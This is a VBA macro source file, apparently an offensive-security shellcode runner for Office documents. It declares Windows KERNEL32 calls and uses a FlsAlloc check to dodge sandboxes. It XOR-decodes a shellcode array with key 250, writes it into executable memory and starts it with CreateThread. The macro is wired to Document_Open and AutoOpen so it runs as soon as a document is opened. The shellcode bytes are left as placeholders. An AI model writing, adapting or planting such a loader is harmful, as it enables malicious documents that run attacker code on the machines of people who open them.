Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal destAddr As LongPtr, ByRef sourceAddr As Any, ByVal length As Long) As LongPtr
Private Declare PtrSafe Function FlsAlloc Lib "KERNEL32" (ByVal callback As LongPtr) As LongPtr

Sub MyMacro()
    Dim allocRes As LongPtr
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    ' Call FlsAlloc and verify if the result exists
    allocRes = FlsAlloc(0)
    If IsNull(allocRes) Then
        End
    End If
    
    ' Shellcode encoded with XOR with key 0xfa/250 (output from C# helper tool of cas van cooten)
    ' If payload more than 25 lines, split it and join as below
    asd = Array(buf)
    das = Array(buf)
    buf = Split(Join(asd, ",") & "," & Join(das, ","), ",")
    
    ' Allocate memory space
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    ' Decode the shellcode
    For i = 0 To UBound(buf)
        buf(i) = buf(i) Xor 250
    Next i
    
    ' Move the shellcode
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    ' Execute the shellcode
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
